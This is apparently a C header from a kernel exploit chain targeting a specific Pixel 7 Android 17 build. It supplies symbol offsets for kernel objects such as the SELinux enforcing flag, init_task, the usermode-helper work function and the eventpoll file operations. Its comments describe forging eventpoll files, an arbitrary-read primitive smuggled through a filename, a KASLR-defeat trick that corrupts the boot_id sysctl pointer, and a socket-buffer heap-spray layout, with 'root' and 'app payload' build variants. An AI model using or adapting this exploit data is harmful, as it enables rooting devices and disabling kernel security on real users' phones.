// panther — Pixel 7, Android 17
// Build:     CP2A.260705.006
// Kernel:    6.1.157-android14-11-gbd23337e42e7-ab14791245
// Interface: android14-6.1
//
// What this build does not share with its kernel interface. Everything else
// is supplied by the interface header included at the end.

#ifndef OFFSET_H
#define OFFSET_H

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "panther-CP2A.260705.006-app"
#else
#define BUILD_VARIANT_LABEL "panther-CP2A.260705.006-root-umh"
#endif
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "google/panther/panther:17/CP2A.260705.006/15641320:user/release-keys"
#endif

// ── Kernel release ──
// Encoded as (major<<16)|(minor<<8)|min(patch,255) so a stage can refuse at
// build time a vehicle whose structure only exists from a given release,
// instead of discovering it on the device.
#define KERNEL_VERSION_CODE 0x06019d  // 6.1.157

// ── Symbol offsets from the image base ──
#define ASHMEM_IOCTL_OFF            0x00c38d28ULL
#define ASHMEM_MMAP_OFF             0x00c396b8ULL
#define ASHMEM_OPEN_OFF             0x00c398d8ULL
#define ASHMEM_RELEASE_OFF          0x00c39960ULL
#define ASHMEM_SHOW_FDINFO_OFF      0x00c39a80ULL
// &ashmem_miscs[0].fops = ashmem_miscs + offsetof(miscdevice, fops=0x10)
#define ASHMEM_MISC_FOPS_OFF        0x0217cb80ULL
#define ASHMEM_FOPS_OFF             0x01280b50ULL
#define ASHMEM_COMPAT_IOCTL_OFF     0x00c39660ULL

#define CONFIGFS_READ_ITER_OFF      0x00464400ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00464930ULL
// 6.1 has no copy_splice_read: configfs uses generic_file_splice_read
#define COPY_SPLICE_READ_OFF        0x003e5fd4ULL
#define NOOP_LLSEEK_OFF             0x003986dcULL
#define INIT_TASK_OFF               0x0201f640ULL
#define ROOT_TASK_GROUP_OFF         0x02208580ULL
// runtime selinux_enforcing = selinux_state.enforcing = selinux_state + 0
#define SELINUX_ENFORCING_OFF       0x0225a420ULL
#define SELINUX_BLOB_SIZES_OFF      0x015ceb88ULL
#define SECURITY_HOOK_HEADS_OFF     0x015ce478ULL
#define KMALLOC_CACHES_OFF          0x015cdfb8ULL
#define ANON_PIPE_BUF_OPS_OFF       0x01109910ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d36f4ULL
#define SYSTEM_UNBOUND_WQ_OFF       0x0200ae60ULL
/* The wake callback an event-poll registration installs on a watched object. */
#define EP_POLL_CALLBACK_OFF        0x00402f68ULL
/* The eventpoll file_operations, which a forged file is checked against. */
#define EVENTPOLL_FOPS_OFF          0x0110bc70ULL
/* A write target for a forged eventpoll: an address whose +0x60 is a
 * self-empty list_head, so the forged ready list is already well formed and
 * the poll path walks it without side effects. A global protocol-handler list
 * satisfies that on a device with no promiscuous packet sockets. */
#define WPOKE_PRIV_OFF              0x02010508ULL
#define EVENTPOLL_FOPS (KIMAGE_TEXT_BASE + EVENTPOLL_FOPS_OFF)

/* Candidate anchors for a read primitive whose forged inode pointer travels
 * inside a filename, so it must contain no NUL and no path separator. Each is
 * a global list_head: its .next is always a valid kernel pointer, so the
 * superblock dereference is safe, and the word the inode number is read from
 * is mapped. A run scans the list and takes the first anchor whose address is
 * byte-clean under the boot's text base, which makes an unusable boot rare
 * rather than a fixed fraction. */
#define AAR_TARGETS(X) \
	X(0x020daa80ULL) /* super_blocks    */ \
	X(0x020ad430ULL) /* modules         */ \
	X(0x020b32a8ULL) /* cgroup_roots    */ \
	X(0x0213bf60ULL) /* dpm_list        */ \
	X(0x0210acb8ULL) /* crypto_alg_list */ \
	X(0x0211e730ULL) /* pci_root_buses  */ \
	X(0x020d2f20ULL) /* vmap_area_list  */

// ── Slide references ──
// Symbols a text-base recovery reads or reaches through.
// nfulnl_logger struct (registered via nf_log_register(NFPROTO_UNSPEC,...)).
#define SLIDE_NFULNL_LOGGER_OFF     0x020129d0ULL
// loggers[0][NF_LOG_TYPE_ULOG=1] = loggers + 8  (holds &nfulnl_logger)
#define SLIDE_LOGGERS_0_1_OFF       0x02012920ULL
// 6.1 serves /proc/sys/kernel/random/boot_id from sysctl_bootid[16]
// (drivers/char/random.c: ctl_table .data = &sysctl_bootid). No separate
// random_boot_id exists on 6.1.
//
// The slide write must corrupt random_table[4].data (the .data pointer of
// the boot_id ctl_table entry), NOT sysctl_bootid itself. proc_do_uuid()
// then treats the corrupted pointer as the buffer address and reads 16
// bytes from there (the contents of loggers[0][1] = &nfulnl_logger).
// random_table @ 0x2137c00; entry idx4 (boot_id) * 0x40 + data@0x8 = 0x2137d08.
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02137d08ULL
// sysctl_bootid buffer itself (restore_slide_boot_id writes &sysctl_bootid
// back into random_table[4].data via SLIDE_SYSCTL_BOOTID).
#define SLIDE_SYSCTL_BOOTID_OFF     0x0227b498ULL
// Write-free KASLR (cves/lib/kaslr/README.md): tracing_mark_write stores its own
// code address (_THIS_IP_ = tracing_mark_write+0x164) into the trace ring
// buffer print_entry.ip; a raw read of trace_pipe_raw returns it unmasked.
// stext = leaked_ip - SLIDE_TRACE_MARK_IP_OFF.
#define SLIDE_TRACE_MARK_IP_OFF     0x001f0ac8ULL
// 6.1 slide uses loggers[0][1] (= SLIDE_LOGGERS_0_1) as the rb parent
// whose content is leaked.
#define SLIDE_LOGGER_PARENT SLIDE_LOGGERS_0_1

#define MM_OWNER_OFF                  0x338

#define WAITER_LOCAL_OFF              0x80
#define WAITER_TREE_ENTRY_OFF         0x00
#define WAITER_PI_TREE_ENTRY_OFF      0x18
#define WAITER_TASK_OFF               0x30
#define WAITER_LOCK_OFF               0x38
#define WAITER_WAKE_STATE_OFF         0x40
#define WAITER_PRIO_OFF               0x44
#define WAITER_DEADLINE_OFF           0x48
#define WAITER_WW_CTX_OFF             0x50
#define FOPS_POST_LLSEEK_OFF    0x10

// ── Socket-buffer spray layout ──
// Signed offset from the kmalloc page base to where a socket send's copied
// data begins: the shared-info tailroom plus the buffer head. A caller adds it
// to its target base when composing the bytes it sprays.
#ifndef SKB_DATA_DELTA
#define SKB_DATA_DELTA (-0xe80LL)
#endif

#include "../kmi/android14-6.1.h"

#endif
